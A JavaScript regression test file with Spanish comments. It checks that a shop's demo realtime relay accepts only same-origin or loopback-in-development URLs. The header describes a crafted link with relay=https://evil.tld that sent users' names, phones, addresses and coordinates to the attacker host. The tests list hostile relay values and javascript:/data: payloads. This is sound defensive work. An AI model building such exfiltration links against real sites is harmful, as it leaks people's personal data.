// El relay de la demo no puede apuntar a un host cualquiera.
//
// POR QUÉ EXISTE ESTE ARCHIVO (F08, P0)
// -------------------------------------
// `sanitizeRelayBase` sólo exigía que el protocolo fuera http o https, así que
// `?relay=` aceptaba CUALQUIER origen. Con eso, un enlace preparado SOBRE EL
// DOMINIO DEL COMERCIO alcanzaba para dos cosas:
//
//   https://<comercio>/?demo=1&relay=https://evil.tld&room=demo&key=<64 hex>
//
//   1. el navegador de la persona publicaba el snapshot de su sesión a
//      `https://evil.tld/publish`, y ese snapshot lleva `customerName`,
//      `customerPhone`, `address` y —dentro de `addressDetails`— `latitude`,
//      `longitude` y `geolocationAccuracy`;
//   2. el mismo host contestaba `/events` y `/snapshot`, o sea que decidía qué
//      pedidos y qué estados veía la persona en la página del comercio, y podía
//      vaciarle la sesión con un `{kind:'reset'}`.
//
// La clave no protegía nada: la elige quien arma el enlace, y el patrón acepta
// sesenta y cuatro hexadecimales cualesquiera.
//
// LO QUE NO ERA, para no sobreleerlo: el relay sólo se inicializa en modo demo,
// y el modo demo no toca el backend, así que los pedidos de PRODUCCIÓN nunca
// viajaron por este canal. Lo que se filtraba era la sesión demo de una persona
// que creía estar en la tienda real —porque el rótulo de simulación es otro
// asunto—, y eso sigue siendo PII de alguien real tecleada en el dominio del
// comercio.
//
// El desarrollo real sí necesita otro origen: el gate sirve el sitio en
// 127.0.0.1:8xxx y el relay en 127.0.0.1:18xxx. Por eso la regla no es «mismo
// origen y nada más», sino «mismo origen, o loopback cuando la página TAMBIÉN
// está en loopback». Sobre un dominio publicado sólo queda la primera.
import assert from 'node:assert/strict';
import test from 'node:test';

/** Carga `js/realtime.js` con una `location` fabricada. */
async function conPagina({ href, origin, hostname }) {
  Object.defineProperty(globalThis, 'location', {
    value: { href, origin, hostname, search: '' },
    configurable: true,
  });
  const modulo = await import(`../js/realtime.js?pagina=${encodeURIComponent(origin)}`);
  return modulo.resolveRelayBase;
}

const COMERCIO = {
  href: 'https://taba2-staging.pages.dev/',
  origin: 'https://taba2-staging.pages.dev',
  hostname: 'taba2-staging.pages.dev',
};

const LOCAL = {
  href: 'http://127.0.0.1:8210/',
  origin: 'http://127.0.0.1:8210',
  hostname: '127.0.0.1',
};

test('sobre el dominio del comercio, un relay ajeno se rechaza', async () => {
  const resolver = await conPagina(COMERCIO);

  for (const hostil of [
    'https://evil.tld',
    'https://attacker.tld/collect/',
    'http://attacker.tld',
    '//evil.tld',
    'https://taba2-staging.pages.dev.evil.tld',
    'https://evil.tld/taba2-staging.pages.dev',
    // Apuntar al loopback DE LA VÍCTIMA tampoco: la página no está en loopback.
    'http://127.0.0.1:18810',
    'http://localhost:18810',
  ]) {
    assert.equal(resolver(hostil), '', `${hostil} no puede habilitar el relay`);
  }
});

test('sobre el dominio del comercio, el mismo origen sigue sirviendo', async () => {
  const resolver = await conPagina(COMERCIO);
  assert.equal(resolver('https://taba2-staging.pages.dev'), 'https://taba2-staging.pages.dev');
  assert.equal(resolver('https://taba2-staging.pages.dev/relay/'), 'https://taba2-staging.pages.dev/relay');
  // Relativo: resuelve contra la propia página, así que es el mismo origen.
  assert.equal(resolver('/relay'), 'https://taba2-staging.pages.dev/relay');
});

test('en desarrollo, el relay en otro puerto de loopback sigue funcionando', async () => {
  // Es el caso del gate: sitio en 8210, relay en 18810. Si esto se rompe, se
  // rompen los specs de realtime, y el arreglo habría cambiado el producto.
  const resolver = await conPagina(LOCAL);
  assert.equal(resolver('http://127.0.0.1:18810'), 'http://127.0.0.1:18810');
  assert.equal(resolver('http://localhost:18810'), 'http://localhost:18810');
  assert.equal(resolver('http://127.0.0.1:8210'), 'http://127.0.0.1:8210');
});

test('ni siquiera en desarrollo se acepta un host externo', async () => {
  const resolver = await conPagina(LOCAL);
  assert.equal(resolver('https://evil.tld'), '');
  assert.equal(resolver('http://192.168.1.50:18810'), '', 'la LAN no es loopback');
});

test('lo que ya se rechazaba se sigue rechazando', async () => {
  const resolver = await conPagina(LOCAL);
  for (const valor of ['', null, undefined, '   ', 'javascript:alert(1)', 'data:text/html,x', 'ftp://host']) {
    assert.equal(resolver(valor), '', `${JSON.stringify(valor)} no es un relay`);
  }
});

test('un texto suelto queda como ruta del propio origen, que es inofensivo', async () => {
  // `new URL('no es una url', href)` no falla: resuelve como ruta relativa, así
  // que termina en el MISMO origen. No se rechaza a propósito —una ruta propia
  // es un relay legítimo— y no puede filtrar nada: el peor caso es que el
  // servidor del comercio conteste 404 y el canal quede apagado.
  const resolver = await conPagina(LOCAL);
  assert.equal(resolver('no es una url'), 'http://127.0.0.1:8210/no%20es%20una%20url');

  const enComercio = await conPagina(COMERCIO);
  assert.match(enComercio('cualquier cosa'), /^https:\/\/taba2-staging\.pages\.dev\//);
});
